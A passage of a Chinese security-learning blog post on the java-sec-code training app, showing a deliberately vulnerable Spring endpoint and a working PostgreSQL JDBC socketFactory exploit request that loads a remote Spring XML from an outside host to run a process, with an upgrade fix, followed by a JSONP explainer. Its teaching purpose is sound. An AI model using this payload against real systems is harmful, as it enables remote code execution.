<h3 id="漏洞代码-9"><a href="#漏洞代码-9" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/postgresql&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postgresql</span><span class="params">(String jdbcUrlBase64)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">byte</span>[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);</span><br><span class="line">    <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(b);</span><br><span class="line">    log.info(jdbcUrl);</span><br><span class="line">    DriverManager.getConnection(jdbcUrl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /jdbc/postgresql HTTP/1.1</span><br><span class="line">Host: sb.dog:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,fr;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 238</span><br><span class="line"></span><br><span class="line">jdbcUrlBase64=amRiYzpwb3N0Z3Jlc3FsOi8vMTI3LjAuMC4xOjU0MzIvdGVzdC8/c29ja2V0RmFjdG9yeT1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5DbGFzc1BhdGhYbWxBcHBsaWNhdGlvbkNvbnRleHQmc29ja2V0RmFjdG9yeUFyZz1odHRwOi8vdGVzdC5qb3ljaG91Lm9yZy8xLnhtbA==</span><br></pre></td></tr></table></figure>

<h4 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://test.joychou.org/1.xml</span><br></pre></td></tr></table></figure>

<h4 id="1-xml"><a href="#1-xml" class="headerlink" title="1.xml"></a>1.xml</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">   &lt;bean id=&quot;exec&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">          &lt;list&gt;</span><br><span class="line">            &lt;value&gt;open&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;-a&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;calculator&lt;/value&gt;</span><br><span class="line">          &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>升级postgresql版本到42.3.2及以上。</p>
<h1 id="jsonp漏洞"><a href="#jsonp漏洞" class="headerlink" title="jsonp漏洞"></a>jsonp漏洞</h1><p>浏览器同源策略就是，A⽹站只能访问A⽹站数据，B⽹站只能访问B⽹站数据，AB不能互相访问数据。JSONP（JSON with Padding）是一种用于解决浏览器跨域请求的技术。由于同源策略的限制，浏览器通常阻止页面发起跨域请求。JSONP通过动态创建 <code>&lt;script&gt;</code> 标签的方式来绕过这一限制，从而实现跨域数据传输。</p>
<blockquote>
<p>理解：注意，这里的跨域是指，当前访问a域名（a.domain.com）加载得到的前端页面，在a域名的前端页面中访问b域名（b.domain.com）的数据，故称之为跨域。</p>
</blockquote>
<h2 id="JSONP工作原理："><a href="#JSONP工作原理：" class="headerlink" title="JSONP工作原理："></a>JSONP工作原理：</h2><ol>
<li><p>客户端（浏览器）在页面中动态创建一个 <code>&lt;script&gt;</code> 标签，并设置其 <code>src</code> 属性指向包含 JSON 数据的资源，同时通过查询字符串或路径参数将回调函数名传递给服务器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 回调函数</span></span><br><span class="line">function <span class="title function_">handleData</span><span class="params">(data)</span> &#123;</span><br><span class="line">    console.log(<span class="string">&quot;Received data:&quot;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// script代码，在其中指明需要由a域名访问到的b域名资源地址</span></span><br><span class="line"><span class="type">var</span> <span class="variable">script</span> <span class="operator">=</span> document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">script.src = <span class="string">&quot;https://example-api.com/data?callback=handleData&quot;</span>;</span><br><span class="line">document.body.appendChild(script);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>服务器根据接收到的回调函数名，将 JSON 数据包装在该回调函数中，返回给客户端。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">fetchDataFromDatabase</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 从数据库获取数据的示例</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//得到回调函数名称</span></span><br><span class="line"><span class="type">var</span> <span class="variable">callbackName</span> <span class="operator">=</span> req.query.callback;</span><br><span class="line"><span class="comment">//获得所需的json数据</span></span><br><span class="line"><span class="type">var</span> <span class="variable">jsonData</span> <span class="operator">=</span> fetchDataFromDatabase();</span><br><span class="line"><span class="comment">//返回json格式的数据，其中包含一段可执行的函数（脚本）</span></span><br><span class="line">res.send(callbackName + <span class="string">&#x27;(&#x27;</span> + JSON.stringify(jsonData) + <span class="string">&#x27;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>浏览器加载由服务器返回的脚本，并执行其中的 JavaScript 代码。这个脚本包含了客户端定义的回调函数，以及在这个回调函数中调用的实际数据。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handleData(&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>

      
    </div>
    <div class="article-footer">
      <blockquote class="mt-2x">
  <ul class="post-copyright list-unstyled">
    
    <li class="post-copyright-link hidden-xs">
      <strong>本文链接：</strong>
      <a href="https://erickinyae.github.io/2023/11/13/Java-Sec-Code/" title="Java-Sec-Code" target="_blank" rel="external">https://erickinyae.github.io/2023/11/13/Java-Sec-Code/</a>
    </li>
    
    <li class="post-copyright-license">
      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
    </li>
  </ul>
</blockquote>


<div class="panel panel-default panel-badger">
  <div class="panel-body">
    <figure class="media">
      <div class="media-left">
        <a href="https://github.com/ErickinYae" target="_blank" class="img-burn thumb-sm visible-lg">
          <img src="/images/icon.png" class="img-rounded w-full" alt="">
        </a>
      </div>
      <div class="media-body">
        <h3 class="media-heading"><a href="https://github.com/ErickinYae" target="_blank"><span class="text-dark">Erickin</span><small class="ml-1x">脚本小子</small></a></h3>
        <div>打工人</div>
      </div>
    </figure>
  </div>
</div>


    </div>
  </article>
  
    
  <section id="comments">
  	
      <div id="vcomments"></div>
    
  </section>


  
</div>

  <nav class="bar bar-footer clearfix" data-stick-bottom>
  <div class="bar-inner">
  
  <ul class="pager pull-left">
    
    <li class="prev">
      <a href="/2023/11/17/problem-resolved/" title="problem-resolved"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
    </li>
    
    
    <li class="next">
      <a href="/2023/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="渗透测试"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
    </li>
    
    
    <li class="toggle-toc">
      <a class="toggle-btn " data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">    <span>[&nbsp;</span><span>文章目录</span>
        <i class="text-collapsed icon icon-anchor"></i>
        <i class="text-in icon icon-close"></i>
        <span>]</span>
      </a>
    </li>
    
  </ul>
  
  
  
  <div class="bar-right">
    
    <div class="share-component" data-sites="weibo,qq,wechat# PC端显示的分享图标" data-mobile-sites="weibo,qq,qzone"></div>
    
  </div>
  </div>
</nav>
  


</main>

  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
	
	
    <ul class="social-links">
    	
        <li><a href="https://github.com/ErickinYae" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
        
    </ul>

    <div class="copyright">
    	
        <div class="publishby">
        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
        </div>
    </div>
</footer>
  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
<script>
window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
</script>

<script src="/js/plugin.min.js"></script>


<script src="/js/application.js"></script>


    <script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(未命名)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>






   


<!-- custom analytics part create by xiamo -->
<script defer src="https://cdn1.lncld.net/static/js/av-min-1.2.1.js"></script>
<script defer>
AV.init({
  appId: 'SUyBw2O3KrfIHPmB9F7wtwKM-gzGzoHsz',
  appKey: 'GytafoX6e83t5QtTlbX6wwQt'
});

function showTime(Counter) {
	var query = new AV.Query(Counter);
		var visitors= $('.leancloud_visitors');
		query.greaterThanOrEqualTo("time", 0);		
		query.find({
			success: function(results) {
				if (results.length == 0) {				
					return;
				}
				var data = results;
				visitors.each(function(){
					var url = $(this).attr('id').trim();					
					for (var i = 0; i < data.length; i++) {
						var object = data[i];
						var content = object.get('time');
						var _url = object.get('url')
						if(url == _url){
							$(this).text(content);
						}
					}
				})
				
			},
			error: function(object, error) {
				console.log("Error: " + error.code + " " + error.message);
			}
		});
}

function addCount(Counter) {
	var Counter = AV.Object.extend("Counter");
	url = $(".leancloud_visitors").attr('id').trim();
	title = $(".leancloud_visitors").attr('data-flag-title').trim();
	var query = new AV.Query(Counter);
	query.equalTo("url", url);
	query.find({
		success: function(results) {
			if (results.length > 0) {
				var counter = results[0];
				counter.fetchWhenSave(true);
				counter.increment("time");
				counter.save(null, {
					success: function(counter) {
						var content = counter.get('time');
						$(document.getElementById(url)).text(content);
					},
					error: function(counter, error) {
						console.log('Failed to save Visitor num, with error message: ' + error.message);
					}
				});
			} else {
				var newcounter = new Counter();
				newcounter.set("title", title);
				newcounter.set("url", url);
				newcounter.set("time", 1);
				newcounter.save(null, {
					success: function(newcounter) {
					    console.log("newcounter.get('time')="+newcounter.get('time'));
						var content = newcounter.get('time');
						$(document.getElementById(url)).text(content);
					},
					error: function(newcounter, error) {
						console.log('Failed to create');
					}
				});
			}
		},
		error: function(error) {
			console.log('Error:' + error.code + " " + error.message);
		}
	});
}
$(function() {
	var Counter = AV.Object.extend("Counter");
	if ($('.leancloud_visitors').length == 1) {
		addCount(Counter);
	} else {
		showTime(Counter);
	}
}); 
</script>



   
    
  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/valine"></script>
  <script type="text/javascript">
  var GUEST = ['nick', 'mail', 'link'];
  var meta = 'nick,mail,link';
  meta = meta.split(',').filter(function(item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#vcomments',
    verify: true,
    notify: true,
    appId: 'SUyBw2O3KrfIHPmB9F7wtwKM-gzGzoHsz',
    appKey: 'GytafoX6e83t5QtTlbX6wwQt',
    placeholder: '说点什么吧',
    avatar: 'mm',
    meta: meta,
    pageSize: '10' || 10,
    visitor: false
  });
  </script>

     







</body>
</html>